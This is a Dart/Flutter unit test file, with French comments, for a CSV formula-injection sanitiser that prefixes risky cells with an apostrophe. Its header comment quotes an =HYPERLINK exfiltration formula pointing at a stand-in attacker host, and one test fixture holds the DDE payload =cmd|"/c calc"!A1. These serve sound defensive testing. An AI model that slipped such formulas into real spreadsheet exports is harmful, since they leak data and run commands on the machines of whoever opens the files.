import 'package:flutter_test/flutter_test.dart';
import 'package:read_files_tech/utils/csv_safe.dart';

/// Tests CsvSafe (H1 v2.12.1) — anti CSV-injection.
///
/// Vise les classiques OWASP : `= + - @ \t \r` en début de cellule sont
/// interprétés comme formule par Excel / LibreOffice / Numbers → vecteur
/// d'exfiltration via `=HYPERLINK("http://attacker/?x=" & A2, "click")`.
void main() {
  group('CsvSafe.sanitizeCell', () {
    test('préfixe = + - @ par une apostrophe', () {
      expect(CsvSafe.sanitizeCell('=1+1'), equals("'=1+1"));
      expect(CsvSafe.sanitizeCell('+CMD'), equals("'+CMD"));
      expect(CsvSafe.sanitizeCell('-2+3'), equals("'-2+3"));
      expect(CsvSafe.sanitizeCell('@SUM(A1:A9)'), equals("'@SUM(A1:A9)"));
    });

    test('préfixe \\t et \\r (anti masquage)', () {
      expect(CsvSafe.sanitizeCell('\t=BAD'), equals("'\t=BAD"));
      expect(CsvSafe.sanitizeCell('\r=BAD'), equals("'\r=BAD"));
    });

    test('laisse intactes les cellules sûres', () {
      expect(CsvSafe.sanitizeCell('Hello'), equals('Hello'));
      expect(CsvSafe.sanitizeCell('42'), equals('42'));
      expect(CsvSafe.sanitizeCell(''), equals(''));
      expect(CsvSafe.sanitizeCell('1=2'), equals('1=2'));
    });

    test('ne touche pas aux non-String (int, double, null)', () {
      expect(CsvSafe.sanitizeCell(42), equals(42));
      expect(CsvSafe.sanitizeCell(3.14), equals(3.14));
      expect(CsvSafe.sanitizeCell(null), isNull);
    });
  });

  group('CsvSafe.encodeSafe', () {
    test('encode des lignes en CSV avec sanitization par cellule', () {
      final out = CsvSafe.encodeSafe([
        ['Nom', 'Valeur'],
        ['Patrice', '=cmd|"/c calc"!A1'],
        ['Sécu', 'OK'],
      ]);
      // La cellule dangereuse doit être préfixée
      expect(out, contains("'=cmd|"));
      // Les cellules normales restent intactes
      expect(out, contains('Patrice'));
      expect(out, contains('Sécu'));
    });

    test('round-trip sur dataset bénin reste lisible', () {
      final out = CsvSafe.encodeSafe([
        ['a', 'b'],
        ['1', '2'],
      ]);
      expect(out.split('\n').length, greaterThanOrEqualTo(2));
    });
  });
}
